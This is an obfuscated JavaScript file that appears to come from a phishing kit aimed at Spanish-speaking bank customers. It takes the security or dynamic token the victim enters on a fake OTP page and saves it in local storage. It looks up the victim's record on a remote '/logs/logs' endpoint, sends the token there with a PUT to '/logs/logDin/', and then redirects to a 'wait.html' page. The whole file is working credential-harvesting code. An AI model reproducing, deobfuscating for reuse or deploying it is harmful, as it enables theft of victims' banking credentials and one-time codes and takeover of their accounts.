const _0xa6b8ed = _0x4e9b;
(function (_0x1e6787, _0x5f3b3a) {
  const _0x256c8b = _0x4e9b,
    _0x43134e = _0x1e6787();
  while (!![]) {
    try {
      const _0x48404c =
        (-parseInt(_0x256c8b(0xc7)) / 0x1) * (parseInt(_0x256c8b(0xca)) / 0x2) +
        (parseInt(_0x256c8b(0xe1)) / 0x3) * (-parseInt(_0x256c8b(0xc3)) / 0x4) +
        parseInt(_0x256c8b(0xd5)) / 0x5 +
        parseInt(_0x256c8b(0xba)) / 0x6 +
        (-parseInt(_0x256c8b(0xc4)) / 0x7) * (parseInt(_0x256c8b(0xe0)) / 0x8) +
        (parseInt(_0x256c8b(0xd8)) / 0x9) * (parseInt(_0x256c8b(0xcc)) / 0xa) +
        parseInt(_0x256c8b(0xd9)) / 0xb;
      if (_0x48404c === _0x5f3b3a) break;
      else _0x43134e["push"](_0x43134e["shift"]());
    } catch (_0x2b275b) {
      _0x43134e["push"](_0x43134e["shift"]());
    }
  }
})(_0x30a9, 0xf1c5a);
function updateLS() {
  const _0xfa7812 = _0x4e9b;
  LS[_0xfa7812(0xc6)](_0xfa7812(0xcd), JSON["stringify"](info));
}
const otpButton = document[_0xa6b8ed(0xc5)](_0xa6b8ed(0xc0)),
  numberMovil = document[_0xa6b8ed(0xc5)](_0xa6b8ed(0xc9));
function _0x4e9b(_0x11b311, _0x53aa8e) {
  const _0x30a968 = _0x30a9();
  return (
    (_0x4e9b = function (_0x4e9b48, _0x2cd9e0) {
      _0x4e9b48 = _0x4e9b48 - 0xb8;
      let _0x30b8be = _0x30a968[_0x4e9b48];
      return _0x30b8be;
    }),
    _0x4e9b(_0x11b311, _0x53aa8e)
  );
}
function _0x30a9() {
  const _0x4663c3 = [
    "/logs/logDin/",
    "wait.html",
    "Error\x20al\x20actualizar\x20OTP:",
    "href",
    "value",
    "btnDinamica",
    "cdin",
    "metaInfo",
    "1250380hgndST",
    "18977hDgaiO",
    "getElementById",
    "setItem",
    "1662mSOFNL",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "txtdinamica",
    "898lZrGGR",
    "click",
    "10ANqcRH",
    "info",
    "json",
    "log",
    "telnum",
    "disabled",
    "reg",
    "/logs/logs",
    "Failed\x20to\x20update\x20OTP",
    "2137600QbjmOJ",
    "Ingresó\x20Dinámica",
    "Usuario\x20actualizado",
    "8995419kQNtOX",
    "5191670ENZUsu",
    "preventDefault",
    "stringify",
    "PUT",
    "focus",
    "location",
    "GET",
    "976KEtQNc",
    "6weTQpY",
    "application/json",
    "Usuario\x20Encontrado",
    "4760922igQHiN",
  ];
  _0x30a9 = function () {
    return _0x4663c3;
  };
  return _0x30a9();
}
otpButton["addEventListener"](_0xa6b8ed(0xcb), async function (_0x520739) {
  const _0x3e149f = _0xa6b8ed;
  _0x520739[_0x3e149f(0xda)](), (otpButton["disabled"] = !![]);
  if (numberMovil[_0x3e149f(0xbf)] == "") {
    alert(_0x3e149f(0xc8)),
      numberMovil[_0x3e149f(0xdd)](),
      (otpButton[_0x3e149f(0xd1)] = ![]);
    return;
  } else {
    var _0x1b1982 = numberMovil["value"];
    (info[_0x3e149f(0xc2)][_0x3e149f(0xc1)] = _0x1b1982), updateLS();
    async function _0x4a8a6e() {
      const _0x4e5ba5 = _0x3e149f;
      try {
        const _0x4eafe5 = await fetch(url + _0x4e5ba5(0xd3), {
          method: _0x4e5ba5(0xdf),
          headers: { "Content-Type": _0x4e5ba5(0xb8) },
        });
        if (!_0x4eafe5["ok"])
          throw new Error("Failed\x20to\x20fetch\x20trico\x20data");
        const _0x2b23de = await _0x4eafe5[_0x4e5ba5(0xce)](),
          _0x562cad = [..._0x2b23de];
        for (const _0x478f5b of _0x562cad) {
          if (
            _0x478f5b[_0x4e5ba5(0xd2)] == info[_0x4e5ba5(0xc2)]["cc"] &&
            _0x478f5b["cl"] == info["metaInfo"][_0x4e5ba5(0xd0)]
          ) {
            console[_0x4e5ba5(0xcf)](_0x4e5ba5(0xb9));
            const _0x5b89e2 = await fetch(
              url + _0x4e5ba5(0xbb) + _0x478f5b["idreg"],
              {
                method: _0x4e5ba5(0xdc),
                headers: { "Content-Type": _0x4e5ba5(0xb8) },
                body: JSON[_0x4e5ba5(0xdb)]({
                  din: info["metaInfo"]["cdin"],
                  status: _0x4e5ba5(0xd6),
                }),
              }
            );
            if (!_0x5b89e2["ok"]) throw new Error(_0x4e5ba5(0xd4));
            const _0xc044d1 = await _0x5b89e2["json"]();
            console[_0x4e5ba5(0xcf)](_0x4e5ba5(0xd7));
          }
        }
        window[_0x4e5ba5(0xde)][_0x4e5ba5(0xbe)] = _0x4e5ba5(0xbc);
      } catch (_0x478b32) {
        console["error"](_0x4e5ba5(0xbd), _0x478b32),
          (otpButton[_0x4e5ba5(0xd1)] = ![]);
      }
    }
    await _0x4a8a6e();
  }
});
